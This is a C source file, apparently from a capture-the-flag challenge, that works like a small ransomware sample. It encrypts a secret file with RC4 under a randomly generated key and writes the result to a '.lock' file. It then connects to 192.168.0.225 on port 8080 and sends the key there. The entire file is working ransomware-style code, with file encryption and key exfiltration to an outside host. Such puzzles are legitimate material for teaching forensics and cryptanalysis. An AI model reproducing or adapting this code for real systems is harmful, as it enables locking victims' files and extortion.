#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#define SA struct sockaddr

#define N 256  // 2^8

void swap(unsigned char *a, unsigned char *b) {
  int tmp = *a;
  *a = *b;
  *b = tmp;
}

int KSA(char *key, unsigned char *S) {
  int len = strlen(key);
  int j = 0;
  for (int i = 0; i < N; i++) S[i] = i;
  for (int i = 0; i < N; i++) {
    j = (j + S[i] + key[i % len]) % N;
    swap(&S[i], &S[j]);
  }
  return 0;
}

int PRGA(unsigned char *S, char *plaintext, unsigned char *ciphertext) {
  int i = 0;
  int j = 0;
  for (size_t n = 0, len = strlen(plaintext); n < len; n++) {
    i = (i + 1) % N;
    j = (j + S[i]) % N;
    swap(&S[i], &S[j]);
    int rnd = S[(S[i] + S[j]) % N];
    ciphertext[n] = rnd ^ plaintext[n];
  }
  return 0;
}

int RC4(char *key, char *plaintext, unsigned char *ciphertext) {
  unsigned char S[N];
  KSA(key, S);
  PRGA(S, plaintext, ciphertext);
  return 0;
}

void generateKey(int l, char *res) {
  srand((unsigned int)time(NULL));
  const char *table =
      "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  for (size_t i = 0; i < l; i++) {
    res[i] = table[rand() % 62];
  }
  res[l] = 0;
}

int main(int argc, char *argv[]) {
  int l = 16;
  unsigned char *key = malloc(l + 1);
  generateKey(l, key);

  char flag[N];

  FILE *fp_src;
  fp_src = fopen("ctf4b_super_secret.txt", "r");
  if (fp_src == NULL) {
    printf("Can't open file.\n");
    return 1;
  }

  if (fgets(flag, N, fp_src) != NULL) {
    unsigned char *ciphertext = malloc(sizeof(int) * strlen(flag));
    RC4(key, flag, ciphertext);
    FILE *fp_dst;
    fp_dst = fopen("ctf4b_super_secret.txt.lock", "w");
    if (fp_dst == NULL) {
      printf("Can't write file.\n");
      return 1;
    }
    for (size_t i = 0; i != strlen(flag); ++i)
      fprintf(fp_dst, "\\x%02x", (unsigned char)ciphertext[i]);
    fclose(fp_dst);
  }
  fclose(fp_src);

  int rsock;
  struct sockaddr_in addr, client;
  rsock = socket(AF_INET, SOCK_STREAM, 0);
  if (rsock < 0) {
    perror("Failed to create socket");
    return 1;
  }
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("192.168.0.225");
  addr.sin_port = htons(8080);
  if (connect(rsock, (SA*)&addr, sizeof(addr)) != 0) {
    perror("Failed to connect");
    return 1;
  }
  write(rsock, key, l + 1);

  return 0;
}
